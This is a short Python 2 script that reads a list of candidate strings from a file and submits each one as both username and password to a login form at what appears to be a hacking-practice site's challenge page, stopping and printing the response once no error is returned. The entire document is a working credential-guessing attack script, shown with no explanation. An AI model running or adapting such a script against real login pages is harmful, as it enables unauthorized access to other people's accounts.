import urllib
import httplib
import re
import StringIO
import sys
import time

headers = {
'Content-Type':'application/x-www-form-urlencoded',
}
countnum=0
for passstring in open('take55_id_data.txt','r'):
	passstring=passstring.strip()
	connection = httplib.HTTPConnection('www.hackerschool.jp')
	connection.request('POST','/hack/take55_attack.php','id='+passstring+'&pass='+passstring,headers)
	response = connection.getresponse()
	data = response.read()
	connection.close()
	if data.find('Error!')==-1 :
		print data
		break
	print countnum
	countnum += 1
	time.sleep(0.1)
